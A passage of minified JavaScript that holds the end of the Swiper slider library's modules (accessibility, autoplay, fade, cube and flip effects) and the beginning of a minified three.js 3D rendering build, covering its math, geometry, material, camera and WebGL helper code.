aria-atomic="true"></span>')})})},on:{afterInit:function(t){t.params.a11y.enabled&&(t.a11y.init(),t.a11y.updateNavigation())},toEdge:function(t){t.params.a11y.enabled&&t.a11y.updateNavigation()},fromEdge:function(t){t.params.a11y.enabled&&t.a11y.updateNavigation()},paginationUpdate:function(t){t.params.a11y.enabled&&t.a11y.updatePagination()},destroy:function(t){t.params.a11y.enabled&&t.a11y.destroy()}}},{name:"history",params:{history:{enabled:!1,replaceState:!1,key:"slides"}},create:function(){E(this,{history:e({},rt)})},on:{init:function(t){t.params.history.enabled&&t.history.init()},destroy:function(t){t.params.history.enabled&&t.history.destroy()},transitionEnd:function(t){t.history.initialized&&t.history.setHistory(t.params.history.key,t.activeIndex)},slideChange:function(t){t.history.initialized&&t.params.cssMode&&t.history.setHistory(t.params.history.key,t.activeIndex)}}},{name:"hash-navigation",params:{hashNavigation:{enabled:!1,replaceState:!1,watchState:!1}},create:function(){E(this,{hashNavigation:e({initialized:!1},at)})},on:{init:function(t){t.params.hashNavigation.enabled&&t.hashNavigation.init()},destroy:function(t){t.params.hashNavigation.enabled&&t.hashNavigation.destroy()},transitionEnd:function(t){t.hashNavigation.initialized&&t.hashNavigation.setHash()},slideChange:function(t){t.hashNavigation.initialized&&t.params.cssMode&&t.hashNavigation.setHash()}}},{name:"autoplay",params:{autoplay:{enabled:!1,delay:3e3,waitForTransition:!0,disableOnInteraction:!0,stopOnLastSlide:!1,reverseDirection:!1}},create:function(){E(this,{autoplay:e(e({},ot),{},{running:!1,paused:!1})})},on:{init:function(t){t.params.autoplay.enabled&&(t.autoplay.start(),a().addEventListener("visibilitychange",t.autoplay.onVisibilityChange))},beforeTransitionStart:function(t,e,i){t.autoplay.running&&(i||!t.params.autoplay.disableOnInteraction?t.autoplay.pause(e):t.autoplay.stop())},sliderFirstMove:function(t){t.autoplay.running&&(t.params.autoplay.disableOnInteraction?t.autoplay.stop():t.autoplay.pause())},touchEnd:function(t){t.params.cssMode&&t.autoplay.paused&&!t.params.autoplay.disableOnInteraction&&t.autoplay.run()},destroy:function(t){t.autoplay.running&&t.autoplay.stop(),a().removeEventListener("visibilitychange",t.autoplay.onVisibilityChange)}}},{name:"effect-fade",params:{fadeEffect:{crossFade:!1}},create:function(){E(this,{fadeEffect:e({},st)})},on:{beforeInit:function(t){if("fade"===t.params.effect){t.classNames.push(t.params.containerModifierClass+"fade");var e={slidesPerView:1,slidesPerColumn:1,slidesPerGroup:1,watchSlidesProgress:!0,spaceBetween:0,virtualTranslate:!0};T(t.params,e),T(t.originalParams,e)}},setTranslate:function(t){"fade"===t.params.effect&&t.fadeEffect.setTranslate()},setTransition:function(t,e){"fade"===t.params.effect&&t.fadeEffect.setTransition(e)}}},{name:"effect-cube",params:{cubeEffect:{slideShadows:!0,shadow:!0,shadowOffset:20,shadowScale:.94}},create:function(){E(this,{cubeEffect:e({},lt)})},on:{beforeInit:function(t){if("cube"===t.params.effect){t.classNames.push(t.params.containerModifierClass+"cube"),t.classNames.push(t.params.containerModifierClass+"3d");var e={slidesPerView:1,slidesPerColumn:1,slidesPerGroup:1,watchSlidesProgress:!0,resistanceRatio:0,spaceBetween:0,centeredSlides:!1,virtualTranslate:!0};T(t.params,e),T(t.originalParams,e)}},setTranslate:function(t){"cube"===t.params.effect&&t.cubeEffect.setTranslate()},setTransition:function(t,e){"cube"===t.params.effect&&t.cubeEffect.setTransition(e)}}},{name:"effect-flip",params:{flipEffect:{slideShadows:!0,limitRotation:!0}},create:function(){E(this,{flipEffect:e({},ct)})},on:{beforeInit:function(t){if("flip"===t.params.effect){t.classNames.push(t.params.containerModifierClass+"flip"),t.classNames.push(t.params.containerModifierClass+"3d");var e={slidesPerView:1,slidesPerColumn:1,slidesPerGroup:1,watchSlidesProgress:!0,spaceBetween:0,virtualTranslate:!0};T(t.params,e),T(t.originalParams,e)}},setTranslate:function(t){"flip"===t.params.effect&&t.flipEffect.setTranslate()},setTransition:function(t,e){"flip"===t.params.effect&&t.flipEffect.setTransition(e)}}},{name:"effect-coverflow",params:{coverflowEffect:{rotate:50,stretch:0,depth:100,scale:1,modifier:1,slideShadows:!0}},create:function(){E(this,{coverflowEffect:e({},ht)})},on:{beforeInit:function(t){"coverflow"===t.params.effect&&(t.classNames.push(t.params.containerModifierClass+"coverflow"),t.classNames.push(t.params.containerModifierClass+"3d"),t.params.watchSlidesProgress=!0,t.originalParams.watchSlidesProgress=!0)},setTranslate:function(t){"coverflow"===t.params.effect&&t.coverflowEffect.setTranslate()},setTransition:function(t,e){"coverflow"===t.params.effect&&t.coverflowEffect.setTransition(e)}}},{name:"thumbs",params:{thumbs:{swiper:null,multipleActiveThumbs:!0,autoScrollOffset:0,slideThumbActiveClass:"swiper-slide-thumb-active",thumbsContainerClass:"swiper-container-thumbs"}},create:function(){E(this,{thumbs:e({swiper:null,initialized:!1},ut)})},on:{beforeInit:function(t){var e=t.params.thumbs;e&&e.swiper&&(t.thumbs.init(),t.thumbs.update(!0))},slideChange:function(t){t.thumbs.swiper&&t.thumbs.update()},update:function(t){t.thumbs.swiper&&t.thumbs.update()},resize:function(t){t.thumbs.swiper&&t.thumbs.update()},observerUpdate:function(t){t.thumbs.swiper&&t.thumbs.update()},setTransition:function(t,e){var i=t.thumbs.swiper;i&&i.setTransition(e)},beforeDestroy:function(t){var e=t.thumbs.swiper;e&&t.thumbs.swiperCreated&&e&&e.destroy()}}}];return V.use(dt),V})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?e(exports):"function"==typeof define&&define.amd?define(["exports"],e):e((t=t||self).THREE={})}(this,(function(t){function e(){}function i(t,e){this.x=t||0,this.y=e||0}function n(t,e,i,n){this._x=t||0,this._y=e||0,this._z=i||0,this._w=void 0!==n?n:1}function r(t,e,i){this.x=t||0,this.y=e||0,this.z=i||0}function a(){this.elements=[1,0,0,0,1,0,0,0,1],0<arguments.length&&console.error("THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.")}function o(t,e,n,r,s,l,c,h,u,d){Object.defineProperty(this,"id",{value:Ia++}),this.uuid=Ca.generateUUID(),this.name="",this.image=void 0!==t?t:o.DEFAULT_IMAGE,this.mipmaps=[],this.mapping=void 0!==e?e:o.DEFAULT_MAPPING,this.wrapS=void 0!==n?n:1001,this.wrapT=void 0!==r?r:1001,this.magFilter=void 0!==s?s:1006,this.minFilter=void 0!==l?l:1008,this.anisotropy=void 0!==u?u:1,this.format=void 0!==c?c:1023,this.type=void 0!==h?h:1009,this.offset=new i(0,0),this.repeat=new i(1,1),this.center=new i(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new a,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.encoding=void 0!==d?d:3e3,this.version=0,this.onUpdate=null}function s(t,e,i,n){this.x=t||0,this.y=e||0,this.z=i||0,this.w=void 0!==n?n:1}function l(t,e,i){this.width=t,this.height=e,this.scissor=new s(0,0,t,e),this.scissorTest=!1,this.viewport=new s(0,0,t,e),i=i||{},this.texture=new o(void 0,void 0,i.wrapS,i.wrapT,i.magFilter,i.minFilter,i.format,i.type,i.anisotropy,i.encoding),this.texture.image={},this.texture.image.width=t,this.texture.image.height=e,this.texture.generateMipmaps=void 0!==i.generateMipmaps&&i.generateMipmaps,this.texture.minFilter=void 0!==i.minFilter?i.minFilter:1006,this.depthBuffer=void 0===i.depthBuffer||i.depthBuffer,this.stencilBuffer=void 0===i.stencilBuffer||i.stencilBuffer,this.depthTexture=void 0!==i.depthTexture?i.depthTexture:null}function c(t,e,i){l.call(this,t,e,i),this.samples=4}function h(){this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],0<arguments.length&&console.error("THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.")}function u(t,e,i,n){this._x=t||0,this._y=e||0,this._z=i||0,this._order=n||u.DefaultOrder}function d(){this.mask=1}function p(){Object.defineProperty(this,"id",{value:Ua++}),this.uuid=Ca.generateUUID(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=p.DefaultUp.clone();var t=new r,e=new u,i=new n,o=new r(1,1,1);e._onChange((function(){i.setFromEuler(e,!1)})),i._onChange((function(){e.setFromQuaternion(i,void 0,!1)})),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:t},rotation:{configurable:!0,enumerable:!0,value:e},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:o},modelViewMatrix:{value:new h},normalMatrix:{value:new a}}),this.matrix=new h,this.matrixWorld=new h,this.matrixAutoUpdate=p.DefaultMatrixAutoUpdate,this.matrixWorldNeedsUpdate=!1,this.layers=new d,this.visible=!0,this.receiveShadow=this.castShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.userData={}}function f(){p.call(this),this.type="Scene",this.overrideMaterial=this.fog=this.background=null,this.autoUpdate=!0,"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}function m(t,e){this.min=void 0!==t?t:new r(1/0,1/0,1/0),this.max=void 0!==e?e:new r(-1/0,-1/0,-1/0)}function g(t,e,i,n,r){var a,o=0;for(a=t.length-3;o<=a;o+=3){fo.fromArray(t,o);var s=r.x*Math.abs(fo.x)+r.y*Math.abs(fo.y)+r.z*Math.abs(fo.z),l=e.dot(fo),c=i.dot(fo),h=n.dot(fo);if(Math.max(-Math.max(l,c,h),Math.min(l,c,h))>s)return!1}return!0}function v(t,e){this.center=void 0!==t?t:new r,this.radius=void 0!==e?e:0}function y(t,e){this.origin=void 0!==t?t:new r,this.direction=void 0!==e?e:new r}function x(t,e,i){this.a=void 0!==t?t:new r,this.b=void 0!==e?e:new r,this.c=void 0!==i?i:new r}function b(t,e,i){return void 0===e&&void 0===i?this.set(t):this.setRGB(t,e,i)}function w(t,e,i){return 0>i&&(i+=1),1<i&&--i,i<1/6?t+6*(e-t)*i:.5>i?e:i<2/3?t+6*(e-t)*(2/3-i):t}function _(t){return.04045>t?.0773993808*t:Math.pow(.9478672986*t+.0521327014,2.4)}function M(t){return.0031308>t?12.92*t:1.055*Math.pow(t,.41666)-.055}function S(t,e,i,n,a,o){this.a=t,this.b=e,this.c=i,this.normal=n&&n.isVector3?n:new r,this.vertexNormals=Array.isArray(n)?n:[],this.color=a&&a.isColor?a:new b,this.vertexColors=Array.isArray(a)?a:[],this.materialIndex=void 0!==o?o:0}function T(){Object.defineProperty(this,"id",{value:No++}),this.uuid=Ca.generateUUID(),this.name="",this.type="Material",this.lights=this.fog=!0,this.blending=1,this.side=0,this.vertexTangents=this.flatShading=!1,this.vertexColors=0,this.opacity=1,this.transparent=!1,this.blendSrc=204,this.blendDst=205,this.blendEquation=100,this.blendEquationAlpha=this.blendDstAlpha=this.blendSrcAlpha=null,this.depthFunc=3,this.depthWrite=this.depthTest=!0,this.stencilFunc=519,this.stencilRef=0,this.stencilMask=255,this.stencilZPass=this.stencilZFail=this.stencilFail=7680,this.stencilWrite=!1,this.clippingPlanes=null,this.clipShadows=this.clipIntersection=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetUnits=this.polygonOffsetFactor=0,this.dithering=!1,this.alphaTest=0,this.premultipliedAlpha=!1,this.toneMapped=this.visible=!0,this.userData={},this.needsUpdate=!0}function E(t){T.call(this),this.type="MeshBasicMaterial",this.color=new b(16777215),this.lightMap=this.map=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.envMap=this.alphaMap=this.specularMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinejoin=this.wireframeLinecap="round",this.lights=this.morphTargets=this.skinning=!1,this.setValues(t)}function C(t,e,i){if(Array.isArray(t))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.name="",this.array=t,this.itemSize=e,this.count=void 0!==t?t.length/e:0,this.normalized=!0===i,this.dynamic=!1,this.updateRange={offset:0,count:-1},this.version=0}function A(t,e,i){C.call(this,new Int8Array(t),e,i)}function L(t,e,i){C.call(this,new Uint8Array(t),e,i)}function P(t,e,i){C.call(this,new Uint8ClampedArray(t),e,i)}function R(t,e,i){C.call(this,new Int16Array(t),e,i)}function O(t,e,i){C.call(this,new Uint16Array(t),e,i)}function I(t,e,i){C.call(this,new Int32Array(t),e,i)}function z(t,e,i){C.call(this,new Uint32Array(t),e,i)}function D(t,e,i){C.call(this,new Float32Array(t),e,i)}function N(t,e,i){C.call(this,new Float64Array(t),e,i)}function k(){this.vertices=[],this.normals=[],this.colors=[],this.uvs=[],this.uvs2=[],this.groups=[],this.morphTargets={},this.skinWeights=[],this.skinIndices=[],this.boundingSphere=this.boundingBox=null,this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1}function B(t){if(0===t.length)return-1/0;for(var e=t[0],i=1,n=t.length;i<n;++i)t[i]>e&&(e=t[i]);return e}function F(){Object.defineProperty(this,"id",{value:ko+=2}),this.uuid=Ca.generateUUID(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingSphere=this.boundingBox=null,this.drawRange={start:0,count:1/0},this.userData={}}function H(t,e){p.call(this),this.type="Mesh",this.geometry=void 0!==t?t:new F,this.material=void 0!==e?e:new E({color:16777215*Math.random()}),this.drawMode=0,this.updateMorphTargets()}function G(t,e,i,n,r,a,o,s){return null===(1===e.side?n.intersectTriangle(o,a,r,!0,s):n.intersectTriangle(r,a,o,2!==e.side,s))?null:(os.copy(s),os.applyMatrix4(t.matrixWorld),(e=i.ray.origin.distanceTo(os))<i.near||e>i.far?null:{distance:e,point:os.clone(),object:t})}function j(t,e,n,r,a,o,s,l,c,h,u){if(Xo.fromBufferAttribute(a,c),Yo.fromBufferAttribute(a,h),$o.fromBufferAttribute(a,u),a=t.morphTargetInfluences,e.morphTargets&&o&&a){Qo.set(0,0,0),ts.set(0,0,0),es.set(0,0,0);for(var d=0,p=o.length;d<p;d++){var f=a[d],m=o[d];0!==f&&(Zo.fromBufferAttribute(m,c),Jo.fromBufferAttribute(m,h),Ko.fromBufferAttribute(m,u),Qo.addScaledVector(Zo.sub(Xo),f),ts.addScaledVector(Jo.sub(Yo),f),es.addScaledVector(Ko.sub($o),f))}Xo.add(Qo),Yo.add(ts),$o.add(es)}return(t=G(t,e,n,r,Xo,Yo,$o,as))&&(s&&(is.fromBufferAttribute(s,c),ns.fromBufferAttribute(s,h),rs.fromBufferAttribute(s,u),t.uv=x.getUV(as,Xo,Yo,$o,is,ns,rs,new i)),l&&(is.fromBufferAttribute(l,c),ns.fromBufferAttribute(l,h),rs.fromBufferAttribute(l,u),t.uv2=x.getUV(as,Xo,Yo,$o,is,ns,rs,new i)),s=new S(c,h,u),x.getNormal(Xo,Yo,$o,s.normal),t.face=s),t}function U(){Object.defineProperty(this,"id",{value:ss+=2}),this.uuid=Ca.generateUUID(),this.name="",this.type="Geometry",this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingSphere=this.boundingBox=null,this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.verticesNeedUpdate=this.elementsNeedUpdate=!1}function V(t,e,i,n,r,a){U.call(this),this.type="BoxGeometry",this.parameters={width:t,height:e,depth:i,widthSegments:n,heightSegments:r,depthSegments:a},this.fromBufferGeometry(new W(t,e,i,n,r,a)),this.mergeVertices()}function W(t,e,i,n,a,o){function s(t,e,i,n,a,o,s,m,g,v,y){var x=o/g,b=s/v,w=o/2,_=s/2,M=m/2;s=g+1;var S,T,E=v+1,C=o=0,A=new r;for(T=0;T<E;T++){var L=T*b-_;for(S=0;S<s;S++)A[t]=(S*x-w)*n,A[e]=L*a,A[i]=M,h.push(A.x,A.y,A.z),A[t]=0,A[e]=0,A[i]=0<m?1:-1,u.push(A.x,A.y,A.z),d.push(S/g),d.push(1-T/v),o+=1}for(T=0;T<v;T++)for(S=0;S<g;S++)t=p+S+s*(T+1),e=p+(S+1)+s*(T+1),i=p+(S+1)+s*T,c.push(p+S+s*T,t,i),c.push(t,e,i),C+=6;l.addGroup(f,C,y),f+=C,p+=o}F.call(this),this.type="BoxBufferGeometry",this.parameters={width:t,height:e,depth:i,widthSegments:n,heightSegments:a,depthSegments:o};var l=this;t=t||1,e=e||1,i=i||1,n=Math.floor(n)||1,a=Math.floor(a)||1,o=Math.floor(o)||1;var c=[],h=[],u=[],d=[],p=0,f=0;s("z","y","x",-1,-1,i,e,t,o,a,0),s("z","y","x",1,-1,i,e,-t,o,a,1),s("x","z","y",1,1,t,i,e,n,o,2),s("x","z","y",1,-1,t,i,-e,n,o,3),s("x","y","z",1,-1,t,e,i,n,a,4),s("x","y","z",-1,-1,t,e,-i,n,a,5),this.setIndex(c),this.addAttribute("position",new D(h,3)),this.addAttribute("normal",new D(u,3)),this.addAttribute("uv",new D(d,2))}function q(t){var e,i={};for(e in t)for(var n in i[e]={},t[e]){var r=t[e][n];r&&(r.isColor||r.isMatrix3||r.isMatrix4||r.isVector2||r.isVector3||r.isVector4||r.isTexture)?i[e][n]=r.clone():Array.isArray(r)?i[e][n]=r.slice():i[e][n]=r}return i}function X(t){for(var e={},i=0;i<t.length;i++){var n,r=q(t[i]);for(n in r)e[n]=r[n]}return e}function Y(t){T.call(this),this.type="ShaderMaterial",this.defines={},this.uniforms={},this.vertexShader="void main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",this.fragmentShader="void main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}",this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.morphNormals=this.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,void 0!==t&&(void 0!==t.attributes&&console.error("THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead."),this.setValues(t))}function $(){p.call(this),this.type="Camera",this.matrixWorldInverse=new h,this.projectionMatrix=new h,this.projectionMatrixInverse=new h}function Z(t,e,i,n){$.call(this),this.type="PerspectiveCamera",this.fov=void 0!==t?t:50,this.zoom=1,this.near=void 0!==i?i:.1,this.far=void 0!==n?n:2e3,this.focus=10,this.aspect=void 0!==e?e:1,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}function J(t,e,i,n){p.call(this),this.type="CubeCamera";var a=new Z(90,1,t,e);a.up.set(0,-1,0),a.lookAt(new r(1,0,0)),this.add(a);var o=new Z(90,1,t,e);o.up.set(0,-1,0),o.lookAt(new r(-1,0,0)),this.add(o);var s=new Z(90,1,t,e);s.up.set(0,0,1),s.lookAt(new r(0,1,0)),this.add(s);var l=new Z(90,1,t,e);l.up.set(0,0,-1),l.lookAt(new r(0,-1,0)),this.add(l);var c=new Z(90,1,t,e);c.up.set(0,-1,0),c.lookAt(new r(0,0,1)),this.add(c);var h=new Z(90,1,t,e);h.up.set(0,-1,0),h.lookAt(new r(0,0,-1)),this.add(h),n=n||{format:1022,magFilter:1006,minFilter:1006},this.renderTarget=new K(i,i,n),this.renderTarget.texture.name="CubeCamera",this.update=function(t,e){null===this.parent&&this.updateMatrixWorld();var i=t.getRenderTarget(),n=this.renderTarget,r=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,t.setRenderTarget(n,0),t.render(e,a),t.setRenderTarget(n,1),t.render(e,o),t.setRenderTarget(n,2),t.render(e,s),t.setRenderTarget(n,3),t.render(e,l),t.setRenderTarget(n,4),t.render(e,c),n.texture.generateMipmaps=r,t.setRenderTarget(n,5),t.render(e,h),t.setRenderTarget(i)},this.clear=function(t,e,i,n){for(var r=t.getRenderTarget(),a=this.renderTarget,o=0;6>o;o++)t.setRenderTarget(a,o),t.clear(e,i,n);t.setRenderTarget(r)}}function K(t,e,i){l.call(this,t,e,i)}function Q(t,e,i,n,r,a,s,l,c,h,u,d){o.call(this,null,a,s,l,c,h,n,r,u,d),this.image={data:t,width:e,height:i},this.magFilter=void 0!==c?c:1003,this.minFilter=void 0!==h?h:1003,this.flipY=this.generateMipmaps=!1,this.unpackAlignment=1}function tt(t,e){this.normal=void 0!==t?t:new r(1,0,0),this.constant=void 0!==e?e:0}function et(t,e,i,n,r,a){this.planes=[void 0!==t?t:new tt,void 0!==e?e:new tt,void 0!==i?i:new tt,void 0!==n?n:new tt,void 0!==r?r:new tt,void 0!==a?a:new tt]}function it(){function t(r,a){!1!==i&&(n(r,a),e.requestAnimationFrame(t))}var e=null,i=!1,n=null;return{start:function(){!0!==i&&null!==n&&(e.requestAnimationFrame(t),i=!0)},stop:function(){i=!1},setAnimationLoop:function(t){n=t},setContext:function(t){e=t}}}function nt(t){var e=new WeakMap;return{get:function(t){return t.isInterleavedBufferAttribute&&(t=t.data),e.get(t)},remove:function(i){i.isInterleavedBufferAttribute&&(i=i.data);var n=e.get(i);n&&(t.deleteBuffer(n.buffer),e.delete(i))},update:function(i,n){i.isInterleavedBufferAttribute&&(i=i.data);var r=e.get(i);if(void 0===r)e.set(i,function(e,i){var n=e.array,r=e.dynamic?35048:35044,a=t.createBuffer();return t.bindBuffer(i,a),t.bufferData(i,n,r),e.onUploadCallback(),i=5126,n instanceof Float32Array?i=5126:n instanceof Float64Array?console.warn("THREE.WebGLAttributes: Unsupported data buffer format: Float64Array."):n instanceof Uint16Array?i=5123:n instanceof Int16Array?i=5122:n instanceof Uint32Array?i=5125:n instanceof Int32Array?i=5124:n instanceof Int8Array?i=5120:n instanceof Uint8Array&&(i=5121),{buffer:a,type:i,bytesPerElement:n.BYTES_PER_ELEMENT,version:e.version}}(i,n));else if(r.version<i.version){var a=i,o=a.array,s=a.updateRange;t.bindBuffer(n,r.buffer),!1===a.dynamic?t.bufferData(n,o,35044):-1===s.count?t.bufferSubData(n,0,o):0===s.count?console.error("THREE.WebGLObjects.updateBuffer: dynamic THREE.BufferAttribute marked as needsUpdate but updateRange.count is 0, ensure you are using set methods or updating manually."):(t.bufferSubData(n,s.offset*o.BYTES_PER_ELEMENT,o.subarray(s.offset,s.offset+s.count)),s.count=-1),r.version=i.version}}}}function rt(t,e,i,n){U.call(this),this.type="PlaneGeometry",this.parameters={width:t,height:e,widthSegments:i,heightSegments:n},this.fromBufferGeometry(new at(t,e,i,n)),this.mergeVertices()}function at(t,e,i,n){F.call(this),this.type="PlaneBufferGeometry",this.parameters={width:t,height:e,widthSegments:i,heightSegments:n};var r=(t=t||1)/2,a=(e=e||1)/2,o=(i=Math.floor(i)||1)+1,s=(n=Math.floor(n)||1)+1,l=t/i,c=e/n,h=[],u=[],d=[],p=[];for(t=0;t<s;t++){var f=t*c-a;for(e=0;e<o;e++)u.push(e*l-r,-f,0),d.push(0,0,1),p.push(e/i),p.push(1-t/n)}for(t=0;t<n;t++)for(e=0;e<i;e++)r=e+o*(t+1),a=e+1+o*(t+1),s=e+1+o*t,h.push(e+o*t,r,s),h.push(r,a,s);this.setIndex(h),this.addAttribute("position",new D(u,3)),this.addAttribute("normal",new D(d,3)),this.addAttribute("uv",new D(p,2))}function ot(t,e,i,n){function r(t,i){e.buffers.color.setClear(t.r,t.g,t.b,i,n)}var a,o,s=new b(0),l=0,c=null,h=0;return{getClearColor:function(){return s},setClearColor:function(t,e){s.set(t),r(s,l=void 0!==e?e:1)},getClearAlpha:function(){return l},setClearAlpha:function(t){r(s,l=t)},render:function(e,n,u,d){n=n.background,(u=(u=t.vr).getSession&&u.getSession())&&"additive"===u.environmentBlendMode&&(n=null),null===n?(r(s,l),c=null,h=0):n&&n.isColor&&(r(n,1),d=!0,c=null,h=0),(t.autoClear||d)&&t.clear(t.autoClearColor,t.autoClearDepth,t.autoClearStencil),n&&(n.isCubeTexture||n.isWebGLRenderTargetCube)?(void 0===o&&((o=new H(new W(1,1,1),new Y({type:"BackgroundCubeMaterial",uniforms:q(xs.cube.uniforms),vertexShader:xs.cube.vertexShader,fragmentShader:xs.cube.fragmentShader,side:1,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),o.geometry.removeAttribute("uv"),o.onBeforeRender=function(t,e,i){this.matrixWorld.copyPosition(i.matrixWorld)},Object.defineProperty(o.material,"map",{get:function(){return this.uniforms.tCube.value}}),i.update(o)),d=n.isWebGLRenderTargetCube?n.texture:n,o.material.uniforms.tCube.value=d,o.material.uniforms.tFlip.value=n.isWebGLRenderTargetCube?1:-1,c===n&&h===d.version||(o.material.needsUpdate=!0,c=n,h=d.version),e.unshift(o,o.geometry,o.material,0,0,null)):n&&n.isTexture&&(void 0===a&&((a=new H(new at(2,2),new Y({type:"BackgroundMaterial",uniforms:q(xs.background.uniforms),vertexShader:xs.background.vertexShader,fragmentShader:xs.background.fragmentShader,side:0,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),Object.defineProperty(a.material,"map",{get:function(){return this.uniforms.t2D.value}}),i.update(a)),a.material.uniforms.t2D.value=n,!0===n.matrixAutoUpdate&&n.updateMatrix(),a.material.uniforms.uvTransform.value.copy(n.matrix),c===n&&h===n.version||(a.material.needsUpdate=!0,c=n,h=n.version),e.unshift(a,a.geometry,a.material,0,0,null))}}}function st(t,e,i,n){var r;this.setMode=function(t){r=t},this.render=function(e,n){t.drawArrays(r,e,n),i.update(n,r)},this.renderInstances=function(a,o,s){if(n.isWebGL2)var l=t,c="drawArraysInstanced";else if(c="drawArraysInstancedANGLE",null===(l=e.get("ANGLE_instanced_arrays")))return void console.error("THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");l[c](r,o,s,a.maxInstancedCount),i.update(s,r,a.maxInstancedCount)}}function lt(t,e,i){function n(e){if("highp"===e){if(0<t.getShaderPrecisionFormat(35633,36338).precision&&0<t.getShaderPrecisionFormat(35632,36338).precision)return"highp";e="mediump"}return"mediump"===e&&0<t.getShaderPrecisionFormat(35633,36337).precision&&0<t.getShaderPrecisionFormat(35632,36337).precision?"mediump":"lowp"}var r,a="undefined"!=typeof WebGL2RenderingContext&&t instanceof WebGL2RenderingContext,o=void 0!==i.precision?i.precision:"highp",s=n(o);s!==o&&(console.warn("THREE.WebGLRenderer:",o,"not supported, using",s,"instead."),o=s),i=!0===i.logarithmicDepthBuffer,s=t.getParameter(34930);var l=t.getParameter(35660),c=t.getParameter(3379),h=t.getParameter(34076),u=t.getParameter(34921),d=t.getParameter(36347),p=t.getParameter(36348),f=t.getParameter(36349),m=0<l,g=a||!!e.get("OES_texture_float");return{isWebGL2:a,getMaxAnisotropy:function(){if(void 0!==r)return r;var i=e.get("EXT_texture_filter_anisotropic");return r=null!==i?t.getParameter(i.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:n,precision:o,logarithmicDepthBuffer:i,maxTextures:s,maxVertexTextures:l,maxTextureSize:c,maxCubemapSize:h,maxAttributes:u,maxVertexUniforms:d,maxVaryings:p,maxFragmentUniforms:f,vertexTextures:m,floatFragmentTextures:g,floatVertexTextures:m&&g,maxSamples:a?t.getParameter(36183):0}}function ct(){function t(){h.value!==n&&(h.value=n,h.needsUpdate=0<r),i.numPlanes=r,i.numIntersection=0}function e(t,e,n,r){var a=null!==t?t.length:0,o=null;if(0!==a){if(o=h.value,!0!==r||null===o)for(r=n+4*a,e=e.matrixWorldInverse,c.getNormalMatrix(e),(null===o||o.length<r)&&(o=new Float32Array(r)),r=0;r!==a;++r,n+=4)l.copy(t[r]).applyMatrix4(e,c),l.normal.toArray(o,n),o[n+3]=l.constant;h.value=o,h.needsUpdate=!0}return i.numPlanes=a,o}var i=this,n=null,r=0,o=!1,s=!1,l=new tt,c=new a,h={value:null,needsUpdate:!1};this.uniform=h,this.numIntersection=this.numPlanes=0,this.init=function(t,i,a){var s=0!==t.length||i||0!==r||o;return o=i,n=e(t,a,0),r=t.length,s},this.beginShadows=function(){s=!0,e(null)},this.endShadows=function(){s=!1,t()},this.setState=function(i,a,l,c,u,d){if(!o||null===i||0===i.length||s&&!l)s?e(null):t();else{var p=4*(l=s?0:r),f=u.clippingState||null;for(h.value=f,f=e(i,c,p,d),i=0;i!==p;++i)f[i]=n[i];u.clippingState=f,this.numIntersection=a?this.numPlanes:0,this.numPlanes+=l}}}function ht(t){var e={};return{get:function(i){if(void 0!==e[i])return e[i];switch(i){case"WEBGL_depth_texture":var n=t.getExtension("WEBGL_depth_texture")||t.getExtension("MOZ_WEBGL_depth_texture")||t.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":n=t.getExtension("EXT_texture_filter_anisotropic")||t.getExtension("MOZ_EXT_texture_filter_anisotropic")||t.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":n=t.getExtension("WEBGL_compressed_texture_s3tc")||t.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||t.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":n=t.getExtension("WEBGL_compressed_texture_pvrtc")||t.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:n=t.getExtension(i)}return null===n&&console.warn("THREE.WebGLRenderer: "+i+" extension not supported."),e[i]=n}}}function ut(t,e,i){function n(t){var r=t.target;for(var s in 